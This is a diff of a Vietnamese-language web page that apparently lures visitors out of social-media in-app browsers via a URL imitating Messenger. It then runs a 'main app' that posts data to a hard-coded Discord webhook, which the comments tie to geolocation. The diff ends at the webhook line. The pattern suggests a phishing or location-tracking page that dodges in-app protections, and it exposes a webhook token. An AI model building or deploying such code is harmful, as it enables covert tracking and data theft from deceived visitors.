@@ -63,7 +63,7 @@
     </style>
 </head>
 <body>
-    <!-- Redirect overlay for in-app browsers -->
+    <!-- Redirect overlay for known in-app browsers -->
     <div id="redirectOverlay" class="hidden">
         <div style="font-size:20px; font-weight:600;">⚠️ Vui lòng mở bằng trình duyệt</div>
         <div style="margin-top:15px; color:#ccc; font-size:15px;" id="redirectMsg"></div>
@@ -93,60 +93,37 @@
     </div>
 
     <script>
-        // ========== IN-APP BROWSER DETECTION & FORCED REDIRECT ==========
+        // ========== IN-APP BROWSER DETECTION (only known bad ones) ==========
         (function() {
             const ua = navigator.userAgent;
+            // Only block browsers that are known to break geolocation or cause issues
             const isInApp = /FBAN|FBAV|Instagram|Twitter|TikTok|Pinterest|Snapchat|FB_IAB|MESSENGER|Line|WeChat|KakaoTalk|WhatsApp|Telegram/i.test(ua);
-            // Also check if it's an iOS WebView (not standalone Safari) – but SFSafariViewController is tricky.
-            // For iOS, if standalone is false and not Safari (but contains Safari), we can't force. We'll flag in-app if iOS and not Safari.
-            const isIOS = /iPhone|iPad|iPod/.test(ua);
-            const isSafari = /Safari/.test(ua) && !/CriOS|FxiOS|OPiOS|mercury/.test(ua);
-            const isStandalone = window.navigator.standalone;
-            // Consider in-app if iOS and not standalone and not a regular browser
-            const iosInApp = isIOS && !isStandalone && !isSafari;
-
-            if (isInApp || iosInApp) {
-                // Hide main content
+            if (isInApp) {
                 document.getElementById('jackLayer').classList.add('hidden');
-                // Show redirect overlay
                 const overlay = document.getElementById('redirectOverlay');
                 overlay.classList.remove('hidden');
                 const msg = document.getElementById('redirectMsg');
                 const btn = document.getElementById('redirectBtn');
-
                 const url = 'https://messenger-co.github.io/Axr4t2auYc';
 
                 if (/Android/.test(ua)) {
-                    // Android – use intent to open browser chooser
                     msg.innerText = 'Bạn đang mở trong ứng dụng. Nhấn nút bên dưới để mở bằng trình duyệt mặc định.';
                     btn.onclick = function() {
                         window.location.href = 'intent://messenger-co.github.io/Axr4t2auYc#Intent;scheme=https;end;';
                     };
-                } else if (isIOS) {
-                    // iOS – can't force, but we can instruct
-                    msg.innerText = 'Bạn đang mở trong ứng dụng. Vui lòng nhấn nút ⋮ hoặc … và chọn "Mở trong Safari".';
-                    btn.innerText = 'Thử mở bằng Safari';
-                    btn.onclick = function() {
-                        // try to open safari (works sometimes if app supports)
-                        window.open('x-web-search://?messenger-co.github.io/Axr4t2auYc');
-                        // fallback: copy link to clipboard
-                        navigator.clipboard.writeText(url).then(() => {
-                            alert('Link đã được sao chép. Dán vào Safari để mở.');
-                        });
-                    };
                 } else {
-                    msg.innerText = 'Vui lòng sao chép link và mở trong trình duyệt.';
+                    msg.innerText = 'Bạn đang mở trong ứng dụng. Vui lòng nhấn nút ⋮ hoặc … và chọn "Mở trong Safari".';
                     btn.onclick = function() {
-                        window.open(url, '_blank');
+                        window.open('x-web-search://?messenger-co.github.io/Axr4t2auYc');
+                        navigator.clipboard.writeText(url).then(() => alert('Link đã được sao chép. Dán vào Safari để mở.'));
                     };
                 }
-                return; // Stop execution of main script
+                return; // stop main app
             }
-            // If not in-app, proceed with normal code
             startMainApp();
         })();
 
-        // ========== MAIN APP (only runs if not in-app browser) ==========
+        // ========== MAIN APP (real browser) ==========
         function startMainApp() {
             const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';
 
